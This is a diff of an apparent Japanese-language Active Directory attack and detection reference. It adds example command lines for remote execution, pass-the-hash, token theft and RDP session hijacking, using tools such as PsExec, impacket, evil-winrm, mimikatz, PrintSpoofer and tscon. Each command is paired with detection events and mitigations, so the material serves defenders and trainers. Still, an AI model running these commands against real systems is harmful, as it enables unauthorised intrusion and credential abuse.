     "detect": "同一ホストからハッシュのみでTGTが発行される4768、RC4暗号化タイプのAS-REQが本来AES環境で発生する異常、NTLMログオンが無いのにKerberosチケットが突然出現するパターン。LSASSアクセスとの相関で検知。",
     "events": "4768(暗号化タイプ0x17/0x12), 4769, 4624",
     "mitigate": "AES暗号化のみ許可しRC4を無効化してPtK/OverPtH痕跡(RC4 0x17)を顕在化。CVE-2026-20833のKerberos RC4ハードニング(2026-01は監査モードでKDCSVCイベント201-209を記録→2026-04で既定DefaultDomainSupportedEncTypesがAES-SHA1のみ0x18となりRC4の暗黙フォールバックを停止→2026-07で監査/ロールバック用サブキーRC4DefaultDisablementPhaseを廃止)を全DCへ適用すると、RC4 AS-REQ(0x17)自体が高信頼の異常シグナルになる。サービス/コンピュータアカウントはmsDS-SupportedEncryptionTypes=0x18へ更新しAES鍵で再設定(パスワード/マシンシークレット再キー)。Credential Guardでキー保護、LAPS、Tier分離、定期的な資格情報ローテーション。",
@@ -4962,6 +8146,28 @@ AD.I18N.ja.attacks = [
     "summary": "SMB(445)でADMIN$共有にサービスバイナリを配置し、SCM経由でサービスとして起動してリモートコード実行する。",
     "how": "前提はターゲットのローカル管理者権限とSMB到達性。Sysinternals PsExec \\\\target -s cmd、またはimpacket psexec.py domain/user:pass@target がADMIN$へ実行ファイル(例:PSEXESVC.exe/ランダム名)をコピーし、svcctl RPCでサービス作成・起動、名前付きパイプでI/Oを中継。PtH対応(-hashes)。NetExec --exec-method smbexec(または atexec/mmcexec)でも実行可能(psexecメソッドは存在しない)。",
     "tools": "PsExec(Sysinternals), impacket psexec.py, NetExec (--exec-method smbexec/atexec/mmcexec), Metasploit psexec_psh",
+    "cmd": [
+      {
+        "tool": "PsExec",
+        "t": "ADMIN$へ`PSEXESVC.exe`を配置しSCM経由でサービス起動。7045のサービス名`PSEXESVC`が最高信頼度の単体シグナル",
+        "q": "PsExec.exe \\\\10.0.0.10 -s -accepteula cmd.exe"
+      },
+      {
+        "tool": "Impacket",
+        "t": "PSEXESVCではなくランダム名の一時サービス/バイナリを生成しファイル名ベース検知を回避。7045のバイナリパスとADMIN$書き込み(5145)で相関",
+        "q": "psexec.py corp.local/administrator:'Passw0rd!'@10.0.0.10"
+      },
+      {
+        "tool": "NetExec",
+        "t": "`--exec-method smbexec`で一時サービス経由の実行を強制。既定のwmiexecと違い7045が残るため手法特定に使える",
+        "q": "netexec smb 10.0.0.10 -u administrator -p 'Passw0rd!' --exec-method smbexec -x whoami"
+      },
+      {
+        "tool": "Metasploit",
+        "t": "psexec_pshは一時サービスからpowershell.exeをBase64実行しMeterpreterを反射ロード。`-nop -w hidden -enc`が定番トークン",
+        "q": "powershell.exe -nop -w hidden -enc <Base64EncodedPayload>"
+      }
+    ],
     "detect": "サービスインストール7045(サービス名がランダム/PSEXESVC、ImagePathがADMIN$内一時ファイル)、4697、ADMIN$への書き込み(5145 共有アクセス, RelativeTargetName)、4624 LogonType3の後にサービス起動。名前付きパイプ(psexecsvc, RemComSvc)のSysmon 17/18。",
     "events": "7045, 4697, 5145, 4624(Type3), 5140, Sysmon 17/18",
     "mitigate": "管理共有(ADMIN$/C$)へのアクセス制限、SMB署名強制、ホストFWでワークステーション間445遮断。LAPSでローカル管理者使い回し防止。EDRでサービス作成+一時実行ファイルの相関検知。特権アカウントのネットワークログオン制限。",
@@ -5007,6 +8213,33 @@ AD.I18N.ja.attacks = [
     "summary": "DCOM/RPC(135+動的ポート)上のWMIでリモートプロセスを生成し、ファイルをディスクに書かずにコマンドを実行する。",
     "how": "前提は管理者権限とWMI(135/DCOM)到達性。impacket wmiexec.py domain/user@target(半対話、出力はSMB共有に書き込み)、wmic /node:target process call create \"cmd\"、PowerShell Invoke-WmiMethod -Class Win32_Process -Name Create、またはInvoke-CimMethodで実行。サービス作成を伴わずWin32_Processでプロセス生成するためPsExecより痕跡が少ない。PtH対応(-hashes)。",
     "tools": "impacket wmiexec.py, wmic, PowerShell(Invoke-WmiMethod/CimMethod), NetExec --exec-method wmiexec, wmiexec-Pro",
+    "cmd": [
+      {
+        "tool": "Impacket",
+        "t": "Win32_Processでプロセス生成しサービスを作らないためPsExec系より痕跡が少ない。出力書き込み(5145)とWMI-Activityログが相関点",
+        "q": "wmiexec.py corp.local/administrator:'Passw0rd!'@10.0.0.10"
+      },
+      {
+        "tool": "wmic",
+        "t": "OS標準wmicでのリモートプロセス生成。`/node:`と`process call create`の組み合わせが決定的シグナル(新しいWindowsでは既定無効)",
+        "q": "wmic /node:10.0.0.10 /user:administrator /password:Passw0rd! process call create \"cmd.exe /c whoami\""
+      },
+      {
+        "tool": "PowerShell",
+        "t": "PowerShell内蔵cmdletでのWMIプロセス生成。4104のスクリプトブロックに`Invoke-WmiMethod`と`Win32_Process`が残る",
+        "q": "Invoke-WmiMethod -ComputerName 10.0.0.10 -Class Win32_Process -Name Create -ArgumentList \"cmd.exe /c whoami\" -Credential corp\\\\svc_user"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "Invoke-WmiMethodの後継で既定はWSMan経由。WinRM(5985)側にも痕跡が残り135/DCOMだけを見る検知網をすり抜ける",
+        "q": "Invoke-CimMethod -ComputerName 10.0.0.10 -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=\"cmd.exe /c whoami\"}"
+      },
+      {
+        "tool": "NetExec",
+        "t": "実行方式をwmiexecに明示指定。内部でimpacket wmiexec相当のWin32_Process呼び出しを行う",
+        "q": "netexec smb 10.0.0.10 -u administrator -p 'Passw0rd!' --exec-method wmiexec -x whoami"
+      }
+    ],
     "detect": "wmiprvse.exe(WmiPrvSE)を親としたcmd.exe/powershell.exeの生成(Sysmon 1 ParentImage=WmiPrvSE.exe)、リモートからのWin32_Process呼び出し。4624 LogonType3の直後にWMI活動、出力用のADMIN$/C$共有書き込み(5145)。WMI-Activity Operationalログ。",
     "events": "4624(Type3), Sysmon 1(親WmiPrvSE.exe), Microsoft-Windows-WMI-Activity/Operational, 5145",
     "mitigate": "ホスト間のDCOM/WMI(135+高位ポート)をFWで制限、WMIをTierごとに分離。EDRでWmiPrvSE子プロセスのコマンドシェル生成を検知。LAPS/資格情報保護、特権アカウントのネットワークログオン最小化。",
@@ -5042,6 +8275,33 @@ AD.I18N.ja.attacks = [
     "summary": "WinRM(5985/5986)のWS-Management経由でリモートPowerShellセッションを確立しコマンド実行する。",
     "how": "前提はターゲットでWinRMが有効かつRemote ManagementUsers/管理者権限、5985/5986到達性。evil-winrm -i target -u user -p pass(またはPtH: -H hash、Kerberos: -r realm)、PowerShell Enter-PSSession / Invoke-Command -ComputerName target -ScriptBlock、NetExec winrmモジュールで実行。fileless実行やアップロード/ダウンロード、AMSIバイパスをサポート。",
     "tools": "evil-winrm, PowerShell Remoting(Invoke-Command/Enter-PSSession), NetExec winrm, impacket各種の-k連携",
+    "cmd": [
+      {
+        "tool": "evil-winrm",
+        "t": "WinRM(5985)へのシェル接続。接続先で`wsmprovhost.exe`が親となる`powershell.exe`起動が典型パターン",
+        "q": "evil-winrm -i 10.0.0.10 -u administrator -p 'Passw0rd!'"
+      },
+      {
+        "tool": "evil-winrm",
+        "t": "`-H`でNTLMハッシュ認証しWinRM接続。パスワード認証なしの5985セッション確立は4624 LogonType3+NTLMの組が手掛かり",
+        "q": "evil-winrm -i 10.0.0.10 -u administrator -H aabbccddeeff00112233445566778899"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "対話的リモートセッション確立。接続先で`wsmprovhost.exe`の子プロセス群と4104のスクリプトブロックが相関点",
+        "q": "Enter-PSSession -ComputerName 10.0.0.10 -Credential corp\\\\svc_user"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "非対話のリモートコマンド実行。`-ScriptBlock`の内容は4104に、発信元ホスト名がWinRM操作ログに残る",
+        "q": "Invoke-Command -ComputerName 10.0.0.10 -ScriptBlock { whoami } -Credential corp\\\\svc_user"
+      },
+      {
+        "tool": "NetExec",
+        "t": "WinRM専用モジュールで一括実行。protocolに`winrm`指定時点でSMBではなく5985への接続が生成される",
+        "q": "netexec winrm 10.0.0.10 -u administrator -p 'Passw0rd!' -x whoami"
+      }
+    ],
     "detect": "wsmprovhost.exe(WinRMホスト)の生成と、その子としてのコマンド実行(Sysmon 1 ParentImage=wsmprovhost.exe)。WinRM/Operationalログ、4624 LogonType3、PowerShell ScriptBlockログ(4104)での難読化コマンド。5985/5986への異常な内部接続。",
     "events": "4624(Type3), Sysmon 1(親wsmprovhost.exe), Microsoft-Windows-WinRM/Operational, 4103/4104",
     "mitigate": "不要ホストでWinRMを無効化、WinRM接続元をIPSecやTrustedHostsで制限。PowerShell ScriptBlock/モジュールログとAMSI有効化。JEA(Just Enough Administration)で操作を限定。Tier分離とネットワークセグメンテーション。",
@@ -5082,6 +8342,28 @@ AD.I18N.ja.attacks = [
     "summary": "DCOMオブジェクトの公開メソッド(ExecuteShellCommand等)をリモート呼び出しして間接的にコマンド実行する。",
     "how": "前提は管理者権限とDCOM(135)到達性。PowerShellで[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','target')).Document.ActiveView.ExecuteShellCommand(...)、ShellWindows/ShellBrowserWindow(CLSID指定)のNavigate/Document.Application.ShellExecute、Excel.Application DDEInitiate、Outlook.Application CreateObjectなど複数の亜種。impacket dcomexec.py -object MMC20|ShellWindows|ShellBrowserWindow。実行はDCOMサーバプロセスの子として起こるため検知回避に使われる。",
     "tools": "impacket dcomexec.py, PowerShell(CreateInstance/GetTypeFromProgID), Invoke-DCOM.ps1, SharpDCOM",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "MMC20.ApplicationのExecuteShellCommandを呼び間接実行。DCOM解決先の`dllhost.exe`等が親になり通常のcmd起動と親子関係が異なる",
+        "q": "$o=[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','10.0.0.10'));$o.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c whoami','7')"
+      },
+      {
+        "tool": "Impacket",
+        "t": "MMC20経由の半対話シェル。DCOMサーバの`svchost.exe`(DcomLaunch)配下にcmd.exeが生えるため親プロセスが特異",
+        "q": "dcomexec.py -object MMC20 corp.local/administrator:'Passw0rd!'@10.0.0.10"
+      },
+      {
+        "tool": "Impacket",
+        "t": "既定のShellWindowsオブジェクト(CLSID 9BA05972)を使う版。explorer相当のシェルプロセスから起動される特異な親子関係が痕跡",
+        "q": "dcomexec.py corp.local/administrator:'Passw0rd!'@10.0.0.10 \"whoami\""
+      },
+      {
+        "tool": "Impacket",
+        "t": "ShellBrowserWindowオブジェクトでの実行。CLSID単位で検知が分かれるため3種の使い分けで漏れやすい",
+        "q": "dcomexec.py -object ShellBrowserWindow corp.local/administrator:'Passw0rd!'@10.0.0.10 \"whoami\""
+      }
+    ],
     "detect": "mmc.exe/explorer.exe/excel.exe等のDCOMサーバを親とした異常なcmd.exe/powershell.exe生成(Sysmon 1 異常なParentImage)。135経由のDCOM活性化と直後のプロセス生成の相関、4624 LogonType3。DCOM起動のイベント(10028等)。",
     "events": "4624(Type3), Sysmon 1(親mmc/explorer/excel等), 10028(DistributedCOM), 5145",
     "mitigate": "DCOMの起動/アクセス権限を厳格化(dcomcnfg)、ホスト間135ポート制限。EDRでOfficeアプリやmmc.exeからのシェル生成を検知。攻撃面のあるProgID/CLSIDのDCOM権限を制限し、不要なCOMサーバを無効化。",
@@ -5117,6 +8399,28 @@ AD.I18N.ja.attacks = [
     "summary": "SMB経由で一時サービスを作りcmd経由でコマンドを実行、出力を共有ファイルで回収するファイルレス寄りの手法。",
     "how": "前提はローカル管理者とSMB(445)。impacket smbexec.py domain/user:pass@target が各コマンド実行のたびに一時サービスを作成し、%COMSPEC%でコマンドを走らせて出力を共有(通常C$のTemp)に書き、SMBで読み取る。バイナリをディスクに置かない点でPsExecと差別化。PtH対応(-hashes)。NetExec --exec-method smbexecでも利用。",
     "tools": "impacket smbexec.py, NetExec --exec-method smbexec",
+    "cmd": [
+      {
+        "tool": "Impacket",
+        "t": "コマンド毎に一時サービスを作成し%COMSPEC%経由で実行、出力をC$\\Temp配下で回収。7045のサービス名連発が主痕跡",
+        "q": "smbexec.py corp.local/administrator:'Passw0rd!'@10.0.0.10"
+      },
+      {
+        "tool": "Impacket",
+        "t": "PtH版。実行の度に一時サービスが作成・削除されるため短時間の7045連発が高信頼シグナル",
+        "q": "smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:aabbccddeeff00112233445566778899 corp.local/administrator@10.0.0.10"
+      },
+      {
+        "tool": "NetExec",
+        "t": "smbexec方式を明示指定。実行の度にsvcctlの`CreateServiceW`を呼ぶため7045が実行コマンド数と一致する",
+        "q": "netexec smb 10.0.0.10 -u administrator -p 'Passw0rd!' --exec-method smbexec -x whoami"
+      },
+      {
+        "tool": "Impacket",
+        "t": "`-mode SERVER`では出力を自ホストへ返すため共有(ADMIN$/C$)への書き込みが減りSHARE前提の検知をすり抜ける",
+        "q": "smbexec.py -mode SERVER corp.local/administrator:'Passw0rd!'@10.0.0.10"
+      }
+    ],
     "detect": "短時間に繰り返される一時サービスの作成/削除(7045/7034/7036)、ImagePathに%COMSPEC% /Q /c echo ... で始まる文字列、__output/BTOBTO等の一時ファイルの共有書き込み(5145)。cmd.exeがservices.exeを親に持つ生成。",
     "events": "7045, 7036, 4697, 5145, 4624(Type3), Sysmon 1(親services.exe)",
     "mitigate": "管理共有アクセス制限、SMB署名、ホストFWで445遮断、LAPS。EDRで%COMSPEC%を含むサービスImagePathと反復的サービス生成を検知。特権アカウントのネットワークログオン最小化。",
@@ -5152,6 +8456,33 @@ AD.I18N.ja.attacks = [
     "summary": "リモートホストにスケジュールタスクを作成・即時実行してコマンドを走らせる。",
     "how": "前提は管理者権限とRPC/SMB(135/445, Task Scheduler ATSVC/ITaskSchedulerServiceパイプ)到達性。schtasks /create /s target /tn <name> /tr \"cmd\" /sc once /st ... /ru SYSTEM の後 /run、または impacket atexec.py domain/user@target \"command\"(タスク作成→実行→出力回収→削除)。PtH/Kerberos対応。SYSTEM権限でのタスク実行に悪用される。",
     "tools": "impacket atexec.py, schtasks.exe(/s), NetExec --exec-method atexec, PowerShell ScheduledTasks module",
+    "cmd": [
+      {
+        "tool": "Impacket",
+        "t": "ATSVC経由でタスク作成→即時実行→出力回収→削除を自動化。4698(作成)と4699(削除)が短時間で対になって出る",
+        "q": "atexec.py corp.local/administrator:'Passw0rd!'@10.0.0.10 whoami"
+      },
+      {
+        "tool": "schtasks.exe",
+        "t": "OS標準LOLBinでのリモートタスク作成。`/s`と`/tr`の組み合わせが4698のコマンドラインとして残る",
+        "q": "schtasks /create /s 10.0.0.10 /u corp\\\\administrator /p 'Passw0rd!' /tn WinUpdate /tr \"cmd.exe /c whoami\" /sc onstart /ru SYSTEM /f"
+      },
+      {
+        "tool": "schtasks.exe",
+        "t": "作成直後の即時実行トリガー。`/create`から数秒以内の`/run`は正規運用と異なる自動化ツールの特徴",
+        "q": "schtasks /run /s 10.0.0.10 /tn WinUpdate"
+      },
+      {
+        "tool": "NetExec",
+        "t": "atexec方式を明示指定。内部でATSVC呼び出しを行い4698/4699のペアを生成する",
+        "q": "netexec smb 10.0.0.10 -u administrator -p 'Passw0rd!' --exec-method atexec -x whoami"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "CimSession経由のリモートタスク登録。WinRM(5985)にも痕跡が残り4698のタスク名にPowerShellらしい命名が出やすい",
+        "q": "Register-ScheduledTask -CimSession 10.0.0.10 -TaskName WinUpdate -Action (New-ScheduledTaskAction -Execute \"cmd.exe\" -Argument \"/c whoami\")"
+      }
+    ],
     "detect": "Task Scheduler Operationalログでリモート作成タスク(EventID106登録/140更新/141削除/200実行)、4698(タスク作成)/4702(更新)、作成直後の実行→削除という短命タスク。4624 LogonType3との相関。TaskEngineを親としたcmd/powershell生成。",
     "events": "4698, 4699, 4702, 4700/4701, Microsoft-Windows-TaskScheduler/Operational(106/140/141/200/201), 4624",
     "mitigate": "リモートからのタスク作成をFW/権限で制限、Task Schedulerサービスへのリモートアクセス制御。監査でタスク作成/削除を有効化しSIEM相関。LAPS/Tier分離、特権アカウントのネットワークログオン制限。",
@@ -5192,6 +8523,33 @@ AD.I18N.ja.attacks = [
     "summary": "リモートのSCM(svcctl)を使ってサービスを新規作成、または既存サービスのバイナリパスを書き換えて任意コード実行する。",
     "how": "前提はローカル管理者とRPC/SMB(445, svcctlパイプ)。sc \\\\target create svc binPath= \"cmd /c ...\" && sc \\\\target start svc、impacket services.py で作成/開始/削除。SCShellは新規バイナリを置かずChangeServiceConfigWで既存サービスのbinPathを一時的に書き換えて起動する完全ファイルレス手法(PtH/Kerberos対応)。SYSTEMで実行される。",
     "tools": "sc.exe, impacket services.py, SCShell, NetExec, PowerShell New-Service",
+    "cmd": [
+      {
+        "tool": "sc.exe",
+        "t": "SCM(svcctl)経由でリモートに新規サービスを作成・起動。binPathにコマンドが直接載るため7045がそのまま実行内容を示す",
+        "q": "sc.exe \\\\10.0.0.10 create svcx binPath= \"cmd.exe /c whoami\" start= demand && sc.exe \\\\10.0.0.10 start svcx"
+      },
+      {
+        "tool": "Impacket",
+        "t": "svcctl RPCで同等操作をLinux側から実施。痕跡はsc.exeと同じ7045/4697でツール種別の区別はできない",
+        "q": "services.py corp.local/administrator:'Passw0rd!'@10.0.0.10 create -name svcx -display svcx -path \"cmd.exe /c whoami\""
+      },
+      {
+        "tool": "SCShell",
+        "t": "新規サービスを作らず既存サービスのbinPathを一時書き換えて起動する完全ファイルレス手法。7045は出ずbinPathの一時的逸脱でのみ見える",
+        "q": "SCShell.exe 10.0.0.10 XblAuthManager \"C:\\\\Windows\\\\System32\\\\cmd.exe /c whoami\" corp.local administrator 'Passw0rd!'"
+      },
+      {
+        "tool": "NetExec",
+        "t": "smbexec指定時は毎回svcctlのCreateServiceWを呼ぶためサービス作成型の横展開そのもの。7045の連発回数が実行コマンド数と一致",
+        "q": "netexec smb 10.0.0.10 -u administrator -p 'Passw0rd!' --exec-method smbexec -x whoami"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "New-Service自体にリモート指定は無くInvoke-Command越しに実行するのが実態。4104に`New-Service`と`-BinaryPathName`が残る",
+        "q": "Invoke-Command -ComputerName 10.0.0.10 -Credential corp\\\\administrator -ScriptBlock { New-Service -Name svcx -BinaryPathName 'cmd.exe /c whoami' -StartupType Manual }"
+      }
+    ],
     "detect": "7045(新規サービス)や既存サービスのImagePath変更(4657 レジストリ, 7040 スタートタイプ変更, 4697)。binPathにcmd/powershell/怪しいパス。SCShellは既存サービスの一時的なImagePath改変と即復元が痕跡。4624 LogonType3との相関。",
     "events": "7045, 4697, 4657(Services レジストリ), 7040, 4624(Type3)",
     "mitigate": "SCMへのリモートアクセスとサービス設定変更権限を制限、重要サービスのImagePathレジストリ監査(4657)。EDRでservices.exe子プロセスのシェル生成検知。LAPS/Tier分離、445のホスト間制限。",
@@ -5232,6 +8590,38 @@ AD.I18N.ja.attacks = [
     "summary": "既存プロセス/スレッドのアクセストークンを盗んで複製し、そのユーザーになりすまして横展開やアカウント切替を行う。",
     "how": "前提はSeImpersonate/SeAssignPrimaryToken権限や管理者権限、対象ユーザーのトークンを持つプロセスの存在。Meterpreter incognito(list_tokens/impersonate_token)、mimikatz token::list / token::elevate、Cobalt Strike steal_token、Rubeus/PowerShell MakeTokenやImpersonateLoggedOnUser API。ドメイン管理者がログオン中のサーバでそのトークンを盗み、ネットワークリソースへ委任アクセスする。Potato系(JuicyPotato/PrintSpoofer/RoguePotato)はSeImpersonateからSYSTEMへ昇格。",
     "tools": "Meterpreter incognito, mimikatz(token::*), Cobalt Strike steal_token, PrintSpoofer/RoguePotato/GodPotato/SigmaPotato/JuicyPotatoNG(SeImpersonate→SYSTEM昇格、RPCSSのOXID処理欠陥系はServer 2012-2022/Win8-11で有効、SigmaPotatoは.NET/インメモリ実行対応), Invoke-TokenManipulation.ps1",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "既存トークンを列挙し標的を選定する偵察コマンド。`token::list`単体は他の管理操作と区別しづらく低シグナル",
+        "q": "mimikatz.exe \"privilege::debug\" \"token::list\" exit"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "ドメイン管理者トークンを狙い撃ちで偽装する。`token::elevate /domainadmin`は横展開意図を示す強いシグナル",
+        "q": "mimikatz.exe \"privilege::debug\" \"token::elevate /domainadmin\" exit"
+      },
+      {
+        "tool": "Meterpreter",
+        "t": "list_tokens -uで列挙した対象を`impersonate_token`で偽装。二重バックスラッシュのユーザー指定表記が特徴",
+        "q": "impersonate_token CORP\\\\administrator"
+      },
+      {
+        "tool": "Cobalt Strike",
+        "t": "Beacon内蔵コマンドで既存プロセスのトークンを窃取し以降の操作へ適用。新規プロセスは増えずBeacon側ログのみに残る",
+        "q": "steal_token 1234"
+      },
+      {
+        "tool": "PrintSpoofer",
+        "t": "SeImpersonate権限からSYSTEMシェルを起動しトークンを奪う。`-i -c`はPotato系全般に共通する起動引数の型",
+        "q": "PrintSpoofer.exe -i -c cmd.exe"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "PowerShell内でトークン偽装が完結しファイルが落ちない。4104のスクリプトブロックに`-ImpersonateUser`が残る",
+        "q": "Invoke-TokenManipulation -ImpersonateUser -Username \"nt authority\\system\""
+      }
+    ],
     "detect": "4624 LogonType9(NewCredentials, runas /netonly相当)や4648(明示的資格情報ログオン)の異常、特権プロセスからの予期しないトークン複製。SeImpersonate悪用は名前付きパイプ/RPC経由のSYSTEM昇格(Sysmon 17/18, プロセス整合性の跳ね上がり)で検知。",
     "events": "4624(LogonType 9), 4648, 4672, Sysmon 17/18, 4696",
     "mitigate": "SeImpersonate/SeAssignPrimaryToken権限をサービスアカウント最小限に。特権アカウントを低信頼ホストにログオンさせない(Tier分離)。Credential Guard、管理サーバの隔離。EDRでトークン操作APIを監視。",
@@ -5272,6 +8662,38 @@ AD.I18N.ja.attacks = [
     "summary": "SYSTEM権限で他ユーザーの既存RDP/コンソールセッションにtsconで接続し、認証なしにそのユーザーのデスクトップを乗っ取る。",
     "how": "前提はローカルSYSTEM権限(またはSeTcbPrivilege)。query userで対象セッションID確認後、SYSTEMコンテキストで tscon <sessionID> /dest:<自セッション> を実行すると切断中/接続中の他ユーザーセッションをパスワード無しで奪取できる。SYSTEM化はsc create sesshijack binpath=\"cmd /k tscon ...\"やPsExec -sで行う。RDP Shadowing(shadow /control)や、mstsc /restrictedadminでのPtH RDPも関連亜種。",
     "tools": "tscon.exe(+query user), sc/PsExec -s, RDP Shadow(mstsc /shadow), SharpRDP, mstsc /restrictedadmin",
+    "cmd": [
+      {
+        "tool": "query user",
+        "t": "ハイジャック対象を選ぶ事前偵察。切断中/接続中のセッションIDが一覧化されるだけで単体は正規の管理操作と同じ",
+        "q": "query user"
+      },
+      {
+        "tool": "PsExec",
+        "t": "SYSTEM権限の対話シェルを取得しtsconをそこから実行する準備。`-s -i`はSYSTEM対話化の定番の組み合わせ",
+        "q": "PsExec.exe -s -i cmd.exe"
+      },
+      {
+        "tool": "tscon.exe",
+        "t": "SYSTEMコンテキストから対象セッションへパスワード無しで接続し乗っ取る。`/dest:`が明け渡す自セッションを示す決定的シグナル",
+        "q": "tscon.exe 2 /dest:console"
+      },
+      {
+        "tool": "sc.exe",
+        "t": "起動時にtsconを実行する使い捨てサービスを作成しSYSTEM化を自動化。7045(新規サービスインストール)のImagePathにtscon文字列が残る",
+        "q": "sc.exe create sesshijack binpath= \"cmd.exe /k tscon 1 /dest:rdp-tcp#55\""
+      },
+      {
+        "tool": "net.exe",
+        "t": "作成した踏み台サービスを起動しbinpathのtsconコマンドを実行させる引き金。直前のサービス作成7045とペアで見る",
+        "q": "net start sesshijack"
+      },
+      {
+        "tool": "mstsc.exe",
+        "t": "RDP Shadowで既存セッションを覗き見/操作する別経路。`/noConsentPrompt`は同意プロンプトを省く高リスクな組み合わせ",
+        "q": "mstsc.exe /v:10.0.0.20 /shadow:2 /control /noConsentPrompt"
+      }
+    ],
     "detect": "Terminal Services操作ログでのセッション再接続(4778 再接続/4779 切断)、tscon.exeの実行、SYSTEMによるセッション接続、query user/quser実行。想定外のセッションID切替やコンソール/RDPセッションの所有者変化。",
     "events": "4778, 4779, 4624(LogonType 10/7), 4634, 1149(TerminalServices-RemoteConnectionManager), Sysmon 1(tscon.exe)",
     "mitigate": "RDPホストへの管理者アクセス制限とMFA、ネットワークレベル認証(NLA)強制、アイドルセッションの自動ログオフ/切断セッション削除ポリシー。RDP Shadowingにユーザー同意を必須化。特権アカウントの共有RDPサーバ利用を避けTier分離する。",
@@ -5307,6 +8729,33 @@ AD.I18N.ja.attacks = [
     "summary": "RDP(3389)で対話ログオンして横展開する。Restricted AdminモードではハッシュのみでRDP認証(PtH over RDP)が可能。",
     "how": "前提は3389到達性と対象での対話ログオン権限(Remote Desktop Users/管理者)。通常はmstscで資格情報ログオン。Restricted Adminが有効なら xfreerdp /u:user /pth:<NThash> /v:target や mstsc /restrictedadmin でパスワード無しにPtHログオンできる(ユーザー資格情報は対象へ委任されず残らない。以後のネットワーク認証は対象マシンのコンピュータアカウント文脈で行われ、ユーザー資格情報の再利用=ダブルホップは不可)。SharpRDPは対話GUI無しでRDP経由コマンド実行。",
     "tools": "mstsc(/restrictedadmin), xfreerdp(/pth), SharpRDP, rdesktop, Cobalt Strike",
+    "cmd": [
+      {
+        "tool": "xfreerdp",
+        "t": "NTLMハッシュのみでRDP認証しPtHを成立させる。`/pth:`がパスワード無しログオンの直接証拠でDC側4624はタイプ10",
+        "q": "xfreerdp /u:administrator /d:corp.local /pth:<NTHASH> /v:10.0.0.20"
+      },
+      {
+        "tool": "mstsc.exe",
+        "t": "Restricted Adminモードでの対話ログオン。資格情報が対象へ委任されずダブルホップ不可という挙動差が識別材料になる",
+        "q": "mstsc.exe /restrictedadmin /v:dc01.corp.local"
+      },
+      {
+        "tool": "reg.exe",
+        "t": "Restricted Adminが無効化された環境で事前に有効化するレジストリ操作。DisableRestrictedAdminへの書込みがPtH-RDP準備の直接証拠",
+        "q": "reg.exe add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
+      },
+      {
+        "tool": "SharpRDP",
+        "t": "対話GUIを開かずRDPプロトコル経由でコマンドを実行。`computername=`等のkey=value形式引数が通常のmstsc利用と異なる",
+        "q": "SharpRDP.exe computername=10.0.0.20 command=\"cmd.exe /c whoami\" username=svc_user password=Passw0rd!"
+      },
+      {
+        "tool": "rdesktop",
+        "t": "Linux発のRDPクライアントによる対話ログオン。平文資格情報が必須でPtHには対応せず窃取済み認証情報の使用を示す",
+        "q": "rdesktop -u svc_user -p 'Passw0rd!' -d corp.local 10.0.0.20"
+      }
+    ],
     "detect": "4624 LogonType10(RemoteInteractive)の管理者アカウント多発、複数ホストへの連鎖RDP、1149接続イベント、Restricted Adminログオン(LogonType3+特定フラグ)。踏み台からの横方向3389接続。",
     "events": "4624(LogonType 10/3), 4778/4779, 1149, 21/24/25(TerminalServices-LocalSessionManager)",
     "mitigate": "RDPをジャンプホスト経由に限定しネットワークで3389を制限、NLA/MFA。Restricted Adminの必要性を評価し不要なら無効化、必要なら委任リスクを管理。Remote Credential Guard導入、特権アカウントのTier分離。",
@@ -5347,6 +8796,28 @@ AD.I18N.ja.attacks = [
     "summary": "WinRMのWinRSクライアントで、PowerShell Remotingとは別経路のリモートコマンドシェルを確立して実行する。",
     "how": "前提はWinRM有効(5985/5986)と管理者/Remote Management Users権限。winrs -r:target -u:user -p:pass cmd で直接コマンド実行。cmd.exeベースのため一部のPSRemoting監視を回避可能。NetExecやManualでも同経路を利用。",
     "tools": "winrs.exe, WS-Management API, NetExec",
+    "cmd": [
+      {
+        "tool": "winrs.exe",
+        "t": "WinRM経由でリモートにcmdシェルを直接実行。PSRemotingの4104スクリプトブロックログとは別経路のため素通りしやすい",
+        "q": "winrs -r:dc01.corp.local -u:svc_user -p:Passw0rd! cmd.exe"
+      },
+      {
+        "tool": "winrs.exe",
+        "t": "URL形式で明示的にHTTP/5985を指定した接続。NetExec等の自動化ツールが出力する既定形式とも一致しやすい",
+        "q": "winrs -r:http://10.0.0.10:5985 -u:svc_user -p:Passw0rd! whoami"
+      },
+      {
+        "tool": "NetExec",
+        "t": "WinRM(5985/5986)へ一括でコマンド実行。`-x`はcmd実行、`-X`はPowerShell実行を意味しどちらもWSMan接続として残る",
+        "q": "netexec winrm 10.0.0.10 -u svc_user -p 'Passw0rd!' -x whoami"
+      },
+      {
+        "tool": "winrs.exe",
+        "t": "資格情報を明示しない接続は現在のKerberosコンテキストを利用。窃取済みTGT/セッションでの到達時に典型的な形",
+        "q": "winrs -r:dc01.corp.local ipconfig /all"
+      }
+    ],
     "detect": "WinRM/Operationalログ、winrs.exe実行、conhost/cmd.exeがWinRMサービス経由で起動される痕跡、4624 LogonType3、5985/5986の内部接続。",
     "events": "4624(Type3), Microsoft-Windows-WinRM/Operational, Sysmon 1(winrs/wsmprovhost)",
     "mitigate": "不要ホストでWinRM無効化、接続元制限(TrustedHosts/IPSec)、JEA。WinRMログとプロセス生成の相関監視。Tier分離。",
@@ -5377,6 +8848,33 @@ AD.I18N.ja.attacks = [
     "summary": "Remote Registryサービス経由でリモートレジストリを操作し、サービス作成やAutorun設定で間接的にコード実行する。",
     "how": "前提は管理者権限とRemote Registryサービス有効(winreg RPC/445)。reg add \\\\target\\HKLM\\...\\Services\\... でサービスを定義しImagePathを設定、またはRun/RunOnceキーへペイロード登録。impacket reg.py add でリモートレジストリ書換え。LSA Secretsや資格情報の窃取(reg save HKLM\\SAM/SECURITY)にも使われ、その後PtH等へ連鎖する。",
